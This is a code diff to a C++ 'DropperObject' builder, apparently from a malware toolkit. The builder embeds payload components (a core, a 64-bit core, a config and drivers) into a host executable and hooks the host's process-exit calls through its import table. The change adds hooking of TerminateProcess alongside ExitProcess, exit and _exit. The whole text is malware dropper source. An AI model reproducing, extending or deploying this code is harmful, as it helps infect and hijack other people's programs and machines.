@@ -69,6 +69,7 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint )
 	
 	// Indexes of calls to be hooked
 	header->hookedCalls.ExitProcess = _hookedCalls["ExitProcess"];
+	header->hookedCalls.TerminateProcess = _hookedCalls["TerminateProcess"];
 	header->hookedCalls.exit = _hookedCalls["exit"];
 	header->hookedCalls._exit = _hookedCalls["_exit"];
 	
@@ -177,6 +178,15 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint )
 	// ExitProcessHook code
 	ptr += _embedFunction((PVOID)ExitProcessHook, (PVOID)ExitProcessHook_End, header->functions.exitProcessHook, ptr);
 	cout << "ExitProcessHook is " << header->functions.exitProcessHook.size << " bytes long, offset " << header->functions.exitProcessHook.offset << endl;
+	
+	// TerminateProcessHook data
+	*((DWORD*) ptr) = ptr - _data.get();
+	ptr += sizeof(DWORD);
+	END_MARKER(ptr);
+	
+	// TerminateProcessHook code
+	ptr += _embedFunction((PVOID)TerminateProcessHook, (PVOID)TerminateProcessHook_End, header->functions.terminateProcessHook, ptr);
+	cout << "TerminateProcessHook is " << header->functions.terminateProcessHook.size << " bytes long, offset " << header->functions.terminateProcessHook.offset << endl;
 	
 	// ExitHook data
 	*((DWORD*) ptr) = ptr - _data.get();
@@ -350,6 +360,7 @@ bool DropperObject::build( bf::path core, bf::path core64, bf::path config, bf::
 			_addDriver64File(driver64.string(), driver64.filename());
 		
 		_hookedCalls["ExitProcess"] = _getIATCallIndex(std::string("kernel32.dll"), std::string("ExitProcess"));	
+		_hookedCalls["TerminateProcess"] = _getIATCallIndex(std::string("kernel32.dll"), std::string("TerminateProcess"));
 		_hookedCalls["exit"] = _getIATCallIndex(std::string("msvcrt.dll"), std::string("exit"));
 		_hookedCalls["_exit"] = _getIATCallIndex(std::string("msvcrt.dll"), std::string("_exit"));
 		
